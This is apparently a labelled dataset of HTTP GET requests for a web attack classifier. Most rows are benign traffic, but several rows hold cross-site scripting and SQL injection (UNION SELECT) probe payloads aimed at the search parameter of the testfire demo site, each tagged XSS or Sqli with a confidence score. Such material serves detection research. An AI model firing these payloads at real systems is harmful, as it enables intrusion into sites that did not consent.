GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/main.fca8df6d.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/main.fd3f1560.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/2.a2026422.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/2.e7093047.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/106.206.77.3,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/login,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/2.a2026422.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/main.fca8df6d.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/2.e7093047.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/main.fd3f1560.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/login,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/2.a2026422.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/css/main.fca8df6d.chunk.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/2.e7093047.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://crapi.apisec.ai/static/js/main.fd3f1560.chunk.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.246,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.246,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.246,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</scriptz>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.246,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</scriptz>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.246,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</scriptz>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.246,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</scriptz>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.246,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(10</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.246,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/202.140.58.246,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=-1 UNION SELECT 1 INTO @,@",,0,0,0,0,5,0,0,0,2,0,0,0,0,Sqli,0.9214
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ip-api.com/json/122.187.97.126,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
